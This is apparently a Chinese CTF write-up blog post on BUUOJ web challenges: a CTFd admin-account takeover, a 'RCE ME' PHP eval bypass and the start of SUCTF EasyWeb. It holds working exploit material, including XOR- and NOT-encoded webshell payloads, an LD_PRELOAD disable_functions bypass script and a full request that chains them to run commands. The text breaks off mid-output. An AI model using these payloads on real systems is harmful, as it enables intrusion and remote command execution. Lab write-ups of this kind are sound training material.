<h1 id="V-amp-N2020-公开赛-HappyCTFd"><a href="#V-amp-N2020-公开赛-HappyCTFd" class="headerlink" title="[V&amp;N2020 公开赛]HappyCTFd"></a>[V&amp;N2020 公开赛]HappyCTFd</h1><p>打开靶机是一个CTFD网站，注册后登陆还发现一个admin用户，flag应该在admin里面</p>
<blockquote>
<ul>
<li>注册一个空格admin用户</li>
<li>登录成功后再登出</li>
<li>在登录页面选择忘记密码</li>
<li>改密链接会发送到注册邮箱中，这里使用buuoj的内部邮箱</li>
<li>在邮箱中修改密码</li>
<li>使用admin用户和更改后的密码进行登录</li>
<li>在Admin Panel =&gt;Challenges页面找到flag</li>
</ul>
</blockquote>
<p>这里使用buu内部邮箱<br><img src="/2020/05/16/BUU-web5/1589528322044.png" alt="1589528322044"></p>
<p><img src="/2020/05/16/BUU-web5/1589528370798.png" alt="1589528370798"></p>
<h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">            $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"This is too Long."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>这里过滤了所有字母和数字，考虑使用无字母数字rce<br>先使用取反构造phpinfo查看禁用函数</p>
<blockquote>
<p>(~%8F%97%8F%96%91%99%90)();</p>
</blockquote>
<p><img src="/2020/05/16/BUU-web5/1589533565181.png" alt="1589533565181"></p>
<p>基本禁完了，先构造一个shell<br>异或</p>
<blockquote>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%87%87%87%87^%d8%c0%c2%d3&#125;[_]($&#123;%87%87%87%87^%d8%c0%c2%d3&#125;[__]);&amp;_=assert&amp;__=<span class="keyword">eval</span>($_POST[%27a%27])</span><br></pre></td></tr></table></figure>
</blockquote>
<p>取反</p>
<blockquote>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;~%A0%B8%BA%AB&#125;[<span class="string">_</span>](<span class="link">$&#123;~%A0%B8%BA%AB&#125;[__]</span>);&amp;<span class="emphasis">_=assert&amp;_</span><span class="emphasis">_=eval($_</span>POST[<span class="string">%27a%27</span>]) 	//$<span class="emphasis">_GET[_</span>]($<span class="emphasis">_GET[_</span>_])</span><br></pre></td></tr></table></figure>
</blockquote>
<p>但是使用蚁剑连上后并不能执行命令，所以要绕过<code>绕过disable_function</code>执行readflag文件</p>
<p>参考文章：<a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv()</a>,也可以直接使用蚁剑的插件进行绕过，但是我本地的蚁剑插件商店加载 有问题，所以尝试另一种方法</p>
<p>因为权限问题我们在蚁剑上无法上传文件到根目录，但是我们可以上传到/tmp，首先下载<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc_x64.so" target="_blank" rel="noopener">bypass_disablefunc_x64.so</a>共享库文件并上传到/tmp目录下面，将其命名为123.so<br>在上传一个123.php文件，其内容为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">	error_log(<span class="string">""</span>,<span class="number">1</span>,<span class="string">""</span>,<span class="string">""</span>);	<span class="comment">#当mail函数被禁用的时候可以使用error_log函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589552461509.png" alt="1589552461509"></p>
<p>之后访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$&#123;%87%87%87%87^%d8%c0%c2%d3&#125;[_]($&#123;%87%87%87%87^%d8%c0%c2%d3&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=include(%27/tmp/123.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/123.so</span><br></pre></td></tr></table></figure>

<p>得到flag<br><img src="/2020/05/16/BUU-web5/1589552523480.png" alt="1589552523480"></p>
<p><a href="https://mayi077.gitee.io/2020/02/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/" target="_blank" rel="noopener">参考文章</a></p>
<h1 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); <span class="comment">#exif_imagetype — 判断一个图像的类型</span></span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>); <span class="comment">#返回一个字符串，包含所有在$hhh中使用过的不同字符,该出为不同的字母不能超过12个</span></span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先最下面发现一个eval函数，所以先尝试绕过一下正则<br>先看看有哪些字符可以利用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">256</span>;$i++)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, chr($i)) )</span><br><span class="line">    <span class="keyword">echo</span> $i.<span class="string">'-----&gt;'</span>.chr($i).<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589590508788.png" alt="1589590508788"></p>
<p>!,#,$,%,(,),*,+,-,/,:,;,&lt;,&gt;,?,@,,],^,{,},€这是上面脚本chr($i)跑出来的可用字符中的可视字符。在浏览器中这些字符都是敏感字符，如果不加单引号双引号，浏览器就把他们用起来了（浏览器进行解析，而不是php语言）所以我们要使用不可视的字符来进行异或脚本的基础字典<br>然后构造一个异或脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">33</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">45</span>,<span class="number">47</span>,<span class="number">58</span>,<span class="number">59</span>,<span class="number">60</span>,<span class="number">62</span>,<span class="number">63</span>,<span class="number">64</span>,<span class="number">92</span>,<span class="number">93</span>,<span class="number">94</span>,<span class="number">123</span>,<span class="number">125</span>,<span class="number">128</span>,<span class="number">129</span>,<span class="number">130</span>,<span class="number">131</span>,<span class="number">132</span>,<span class="number">133</span>,<span class="number">134</span>,<span class="number">135</span>,<span class="number">136</span>,<span class="number">137</span>,<span class="number">138</span>,<span class="number">139</span>,<span class="number">140</span>,<span class="number">141</span>,<span class="number">142</span>,<span class="number">143</span>,<span class="number">144</span>,<span class="number">145</span>,<span class="number">146</span>,<span class="number">147</span>,<span class="number">148</span>,<span class="number">149</span>,<span class="number">150</span>,<span class="number">151</span>,<span class="number">152</span>,<span class="number">153</span>,<span class="number">154</span>,<span class="number">155</span>,<span class="number">156</span>,<span class="number">157</span>,<span class="number">158</span>,<span class="number">159</span>,<span class="number">160</span>,<span class="number">161</span>,<span class="number">162</span>,<span class="number">163</span>,<span class="number">164</span>,<span class="number">165</span>,<span class="number">166</span>,<span class="number">167</span>,<span class="number">168</span>,<span class="number">169</span>,<span class="number">170</span>,<span class="number">171</span>,<span class="number">172</span>,<span class="number">173</span>,<span class="number">174</span>,<span class="number">175</span>,<span class="number">176</span>,<span class="number">177</span>,<span class="number">178</span>,<span class="number">179</span>,<span class="number">180</span>,<span class="number">181</span>,<span class="number">182</span>,<span class="number">183</span>,<span class="number">184</span>,<span class="number">185</span>,<span class="number">186</span>,<span class="number">187</span>,<span class="number">188</span>,<span class="number">189</span>,<span class="number">190</span>,<span class="number">191</span>,<span class="number">192</span>,<span class="number">193</span>,<span class="number">194</span>,<span class="number">195</span>,<span class="number">196</span>,<span class="number">197</span>,<span class="number">198</span>,<span class="number">199</span>,<span class="number">200</span>,<span class="number">201</span>,<span class="number">202</span>,<span class="number">203</span>,<span class="number">204</span>,<span class="number">205</span>,<span class="number">206</span>,<span class="number">207</span>,<span class="number">208</span>,<span class="number">209</span>,<span class="number">210</span>,<span class="number">211</span>,<span class="number">212</span>,<span class="number">213</span>,<span class="number">214</span>,<span class="number">215</span>,<span class="number">216</span>,<span class="number">217</span>,<span class="number">218</span>,<span class="number">219</span>,<span class="number">220</span>,<span class="number">221</span>,<span class="number">222</span>,<span class="number">223</span>,<span class="number">224</span>,<span class="number">225</span>,<span class="number">226</span>,<span class="number">227</span>,<span class="number">228</span>,<span class="number">229</span>,<span class="number">230</span>,<span class="number">231</span>,<span class="number">232</span>,<span class="number">233</span>,<span class="number">234</span>,<span class="number">235</span>,<span class="number">236</span>,<span class="number">237</span>,<span class="number">238</span>,<span class="number">239</span>,<span class="number">240</span>,<span class="number">241</span>,<span class="number">242</span>,<span class="number">243</span>,<span class="number">244</span>,<span class="number">245</span>,<span class="number">246</span>,<span class="number">247</span>,<span class="number">248</span>,<span class="number">249</span>,<span class="number">250</span>,<span class="number">251</span>,<span class="number">252</span>,<span class="number">253</span>,<span class="number">254</span>,<span class="number">255</span>,]</span><br><span class="line"><span class="comment">#a是上面的php脚本出来的数据，通过preg_match的字符</span></span><br><span class="line">_=[]</span><br><span class="line">G=[]</span><br><span class="line">E=[]</span><br><span class="line">T=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a[<span class="number">27</span>:]:<span class="comment">#截取a列表27后面的数据，目的是避开可视字符。我们需要不可视字符来异或</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a[<span class="number">27</span>:]:</span><br><span class="line">        tem=(i^j)</span><br><span class="line">        <span class="keyword">if</span>(chr(tem)==<span class="string">"_"</span>):</span><br><span class="line">            _.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">"*"</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">if</span>(chr(tem)==<span class="string">"G"</span>):</span><br><span class="line">            G.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">"*"</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">if</span> (chr(tem) == <span class="string">"E"</span>):</span><br><span class="line">            temp = []</span><br><span class="line">            E.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">"*"</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">if</span> (chr(tem)== <span class="string">"T"</span>):</span><br><span class="line">            T.append((str(hex(i)[<span class="number">2</span>:])) + <span class="string">"*"</span> + str(hex(j)[<span class="number">2</span>:]))</span><br><span class="line">print(_)</span><br><span class="line">print(G)</span><br><span class="line">print(E)</span><br><span class="line">print(T)</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">'86*d9</span>', <span class="symbol">'87*d8</span>', <span class="symbol">'88*d7</span>', <span class="symbol">'89*d6</span>', <span class="symbol">'8a*d5</span>', <span class="symbol">'8b*d4</span>', <span class="symbol">'8c*d3</span>', <span class="symbol">'8d*d2</span>', <span class="symbol">'8e*d1</span>', <span class="symbol">'8f*d0</span>', <span class="symbol">'90*cf</span>', <span class="symbol">'91*ce</span>', <span class="symbol">'92*cd</span>', <span class="symbol">'93*cc</span>', <span class="symbol">'94*cb</span>', <span class="symbol">'95*ca</span>', <span class="symbol">'96*c9</span>', <span class="symbol">'97*c8</span>', <span class="symbol">'98*c7</span>', <span class="symbol">'99*c6</span>', <span class="symbol">'9a*c5</span>', <span class="symbol">'9b*c4</span>', <span class="symbol">'9c*c3</span>', <span class="symbol">'9d*c2</span>', <span class="symbol">'9e*c1</span>', <span class="symbol">'9f*c0</span>', <span class="symbol">'a0*ff</span>', <span class="symbol">'a1*fe</span>', <span class="symbol">'a2*fd</span>', <span class="symbol">'a3*fc</span>', <span class="symbol">'a4*fb</span>', <span class="symbol">'a5*fa</span>', <span class="symbol">'a6*f9</span>', <span class="symbol">'a7*f8</span>', <span class="symbol">'a8*f7</span>', <span class="symbol">'a9*f6</span>', <span class="symbol">'aa*f5</span>', <span class="symbol">'ab*f4</span>', <span class="symbol">'ac*f3</span>', <span class="symbol">'ad*f2</span>', <span class="symbol">'ae*f1</span>', <span class="symbol">'af*f0</span>', <span class="symbol">'b0*ef</span>', <span class="symbol">'b1*ee</span>', <span class="symbol">'b2*ed</span>', <span class="symbol">'b3*ec</span>', <span class="symbol">'b4*eb</span>', <span class="symbol">'b5*ea</span>', <span class="symbol">'b6*e9</span>', <span class="symbol">'b7*e8</span>', <span class="symbol">'b8*e7</span>', <span class="symbol">'b9*e6</span>', <span class="symbol">'ba*e5</span>', <span class="symbol">'bb*e4</span>', <span class="symbol">'bc*e3</span>', <span class="symbol">'bd*e2</span>', <span class="symbol">'be*e1</span>', <span class="symbol">'bf*e0</span>', <span class="symbol">'c0*9f</span>', <span class="symbol">'c1*9e</span>', <span class="symbol">'c2*9d</span>', <span class="symbol">'c3*9c</span>', <span class="symbol">'c4*9b</span>', <span class="symbol">'c5*9a</span>', <span class="symbol">'c6*99</span>', <span class="symbol">'c7*98</span>', <span class="symbol">'c8*97</span>', <span class="symbol">'c9*96</span>', <span class="symbol">'ca*95</span>', <span class="symbol">'cb*94</span>', <span class="symbol">'cc*93</span>', <span class="symbol">'cd*92</span>', <span class="symbol">'ce*91</span>', <span class="symbol">'cf*90</span>', <span class="symbol">'d0*8f</span>', <span class="symbol">'d1*8e</span>', <span class="symbol">'d2*8d</span>', <span class="symbol">'d3*8c</span>', <span class="symbol">'d4*8b</span>', <span class="symbol">'d5*8a</span>', <span class="symbol">'d6*89</span>', <span class="symbol">'d7*88</span>', <span class="symbol">'d8*87</span>', <span class="symbol">'d9*86</span>', <span class="symbol">'e0*bf</span>', <span class="symbol">'e1*be</span>', <span class="symbol">'e2*bd</span>', <span class="symbol">'e3*bc</span>', <span class="symbol">'e4*bb</span>', <span class="symbol">'e5*ba</span>', <span class="symbol">'e6*b9</span>', <span class="symbol">'e7*b8</span>', <span class="symbol">'e8*b7</span>', <span class="symbol">'e9*b6</span>', <span class="symbol">'ea*b5</span>', <span class="symbol">'eb*b4</span>', <span class="symbol">'ec*b3</span>', <span class="symbol">'ed*b2</span>', <span class="symbol">'ee*b1</span>', <span class="symbol">'ef*b0</span>', <span class="symbol">'f0*af</span>', <span class="symbol">'f1*ae</span>', <span class="symbol">'f2*ad</span>', <span class="symbol">'f3*ac</span>', <span class="symbol">'f4*ab</span>', <span class="symbol">'f5*aa</span>', <span class="symbol">'f6*a9</span>', <span class="symbol">'f7*a8</span>', <span class="symbol">'f8*a7</span>', <span class="symbol">'f9*a6</span>', <span class="symbol">'fa*a5</span>', <span class="symbol">'fb*a4</span>', <span class="symbol">'fc*a3</span>', <span class="symbol">'fd*a2</span>', <span class="symbol">'fe*a1</span>', <span class="symbol">'ff*a0</span>']</span><br><span class="line">[<span class="symbol">'86*c1</span>', <span class="symbol">'87*c0</span>', <span class="symbol">'88*cf</span>', <span class="symbol">'89*ce</span>', <span class="symbol">'8a*cd</span>', <span class="symbol">'8b*cc</span>', <span class="symbol">'8c*cb</span>', <span class="symbol">'8d*ca</span>', <span class="symbol">'8e*c9</span>', <span class="symbol">'8f*c8</span>', <span class="symbol">'90*d7</span>', <span class="symbol">'91*d6</span>', <span class="symbol">'92*d5</span>', <span class="symbol">'93*d4</span>', <span class="symbol">'94*d3</span>', <span class="symbol">'95*d2</span>', <span class="symbol">'96*d1</span>', <span class="symbol">'97*d0</span>', <span class="symbol">'98*df</span>', <span class="symbol">'99*de</span>', <span class="symbol">'9a*dd</span>', <span class="symbol">'9b*dc</span>', <span class="symbol">'9c*db</span>', <span class="symbol">'9d*da</span>', <span class="symbol">'9e*d9</span>', <span class="symbol">'9f*d8</span>', <span class="symbol">'a0*e7</span>', <span class="symbol">'a1*e6</span>', <span class="symbol">'a2*e5</span>', <span class="symbol">'a3*e4</span>', <span class="symbol">'a4*e3</span>', <span class="symbol">'a5*e2</span>', <span class="symbol">'a6*e1</span>', <span class="symbol">'a7*e0</span>', <span class="symbol">'a8*ef</span>', <span class="symbol">'a9*ee</span>', <span class="symbol">'aa*ed</span>', <span class="symbol">'ab*ec</span>', <span class="symbol">'ac*eb</span>', <span class="symbol">'ad*ea</span>', <span class="symbol">'ae*e9</span>', <span class="symbol">'af*e8</span>', <span class="symbol">'b0*f7</span>', <span class="symbol">'b1*f6</span>', <span class="symbol">'b2*f5</span>', <span class="symbol">'b3*f4</span>', <span class="symbol">'b4*f3</span>', <span class="symbol">'b5*f2</span>', <span class="symbol">'b6*f1</span>', <span class="symbol">'b7*f0</span>', <span class="symbol">'b8*ff</span>', <span class="symbol">'b9*fe</span>', <span class="symbol">'ba*fd</span>', <span class="symbol">'bb*fc</span>', <span class="symbol">'bc*fb</span>', <span class="symbol">'bd*fa</span>', <span class="symbol">'be*f9</span>', <span class="symbol">'bf*f8</span>', <span class="symbol">'c0*87</span>', <span class="symbol">'c1*86</span>', <span class="symbol">'c8*8f</span>', <span class="symbol">'c9*8e</span>', <span class="symbol">'ca*8d</span>', <span class="symbol">'cb*8c</span>', <span class="symbol">'cc*8b</span>', <span class="symbol">'cd*8a</span>', <span class="symbol">'ce*89</span>', <span class="symbol">'cf*88</span>', <span class="symbol">'d0*97</span>', <span class="symbol">'d1*96</span>', <span class="symbol">'d2*95</span>', <span class="symbol">'d3*94</span>', <span class="symbol">'d4*93</span>', <span class="symbol">'d5*92</span>', <span class="symbol">'d6*91</span>', <span class="symbol">'d7*90</span>', <span class="symbol">'d8*9f</span>', <span class="symbol">'d9*9e</span>', <span class="symbol">'da*9d</span>', <span class="symbol">'db*9c</span>', <span class="symbol">'dc*9b</span>', <span class="symbol">'dd*9a</span>', <span class="symbol">'de*99</span>', <span class="symbol">'df*98</span>', <span class="symbol">'e0*a7</span>', <span class="symbol">'e1*a6</span>', <span class="symbol">'e2*a5</span>', <span class="symbol">'e3*a4</span>', <span class="symbol">'e4*a3</span>', <span class="symbol">'e5*a2</span>', <span class="symbol">'e6*a1</span>', <span class="symbol">'e7*a0</span>', <span class="symbol">'e8*af</span>', <span class="symbol">'e9*ae</span>', <span class="symbol">'ea*ad</span>', <span class="symbol">'eb*ac</span>', <span class="symbol">'ec*ab</span>', <span class="symbol">'ed*aa</span>', <span class="symbol">'ee*a9</span>', <span class="symbol">'ef*a8</span>', <span class="symbol">'f0*b7</span>', <span class="symbol">'f1*b6</span>', <span class="symbol">'f2*b5</span>', <span class="symbol">'f3*b4</span>', <span class="symbol">'f4*b3</span>', <span class="symbol">'f5*b2</span>', <span class="symbol">'f6*b1</span>', <span class="symbol">'f7*b0</span>', <span class="symbol">'f8*bf</span>', <span class="symbol">'f9*be</span>', <span class="symbol">'fa*bd</span>', <span class="symbol">'fb*bc</span>', <span class="symbol">'fc*bb</span>', <span class="symbol">'fd*ba</span>', <span class="symbol">'fe*b9</span>', <span class="symbol">'ff*b8</span>']</span><br><span class="line">[<span class="symbol">'86*c3</span>', <span class="symbol">'87*c2</span>', <span class="symbol">'88*cd</span>', <span class="symbol">'89*cc</span>', <span class="symbol">'8a*cf</span>', <span class="symbol">'8b*ce</span>', <span class="symbol">'8c*c9</span>', <span class="symbol">'8d*c8</span>', <span class="symbol">'8e*cb</span>', <span class="symbol">'8f*ca</span>', <span class="symbol">'90*d5</span>', <span class="symbol">'91*d4</span>', <span class="symbol">'92*d7</span>', <span class="symbol">'93*d6</span>', <span class="symbol">'94*d1</span>', <span class="symbol">'95*d0</span>', <span class="symbol">'96*d3</span>', <span class="symbol">'97*d2</span>', <span class="symbol">'98*dd</span>', <span class="symbol">'99*dc</span>', <span class="symbol">'9a*df</span>', <span class="symbol">'9b*de</span>', <span class="symbol">'9c*d9</span>', <span class="symbol">'9d*d8</span>', <span class="symbol">'9e*db</span>', <span class="symbol">'9f*da</span>', <span class="symbol">'a0*e5</span>', <span class="symbol">'a1*e4</span>', <span class="symbol">'a2*e7</span>', <span class="symbol">'a3*e6</span>', <span class="symbol">'a4*e1</span>', <span class="symbol">'a5*e0</span>', <span class="symbol">'a6*e3</span>', <span class="symbol">'a7*e2</span>', <span class="symbol">'a8*ed</span>', <span class="symbol">'a9*ec</span>', <span class="symbol">'aa*ef</span>', <span class="symbol">'ab*ee</span>', <span class="symbol">'ac*e9</span>', <span class="symbol">'ad*e8</span>', <span class="symbol">'ae*eb</span>', <span class="symbol">'af*ea</span>', <span class="symbol">'b0*f5</span>', <span class="symbol">'b1*f4</span>', <span class="symbol">'b2*f7</span>', <span class="symbol">'b3*f6</span>', <span class="symbol">'b4*f1</span>', <span class="symbol">'b5*f0</span>', <span class="symbol">'b6*f3</span>', <span class="symbol">'b7*f2</span>', <span class="symbol">'b8*fd</span>', <span class="symbol">'b9*fc</span>', <span class="symbol">'ba*ff</span>', <span class="symbol">'bb*fe</span>', <span class="symbol">'bc*f9</span>', <span class="symbol">'bd*f8</span>', <span class="symbol">'be*fb</span>', <span class="symbol">'bf*fa</span>', <span class="symbol">'c2*87</span>', <span class="symbol">'c3*86</span>', <span class="symbol">'c8*8d</span>', <span class="symbol">'c9*8c</span>', <span class="symbol">'ca*8f</span>', <span class="symbol">'cb*8e</span>', <span class="symbol">'cc*89</span>', <span class="symbol">'cd*88</span>', <span class="symbol">'ce*8b</span>', <span class="symbol">'cf*8a</span>', <span class="symbol">'d0*95</span>', <span class="symbol">'d1*94</span>', <span class="symbol">'d2*97</span>', <span class="symbol">'d3*96</span>', <span class="symbol">'d4*91</span>', <span class="symbol">'d5*90</span>', <span class="symbol">'d6*93</span>', <span 